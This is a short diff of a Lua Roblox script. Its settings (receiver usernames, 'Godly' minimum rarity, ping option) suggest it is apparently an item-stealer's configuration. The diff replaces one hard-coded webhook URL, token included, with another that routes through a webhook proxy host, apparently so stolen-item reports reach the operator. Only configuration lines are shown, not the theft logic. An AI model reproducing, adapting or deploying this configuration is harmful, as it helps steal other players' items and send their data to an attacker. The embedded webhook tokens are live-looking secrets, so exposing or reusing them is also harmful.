@@ -21,7 +21,7 @@ local users = _G.Usernames or {"WspNegatron5"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1536391097285087263/qF7Vlvud9CerBlObfDlJEyVli2LGuI37VOhyQLRoZFGWCLB5XOC4pY388OWND9_lOK_g"
+local webhook = _G.webhook or "https://webhook.lewisakura.moe/api/webhooks/1528302424652124253/Y_IPrVmYyQRc4jDj8v8XdiykX6cidHqlqM0ju0ZGUqcSp4sBy2uct2kFBEc-mQ31Mn1h"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
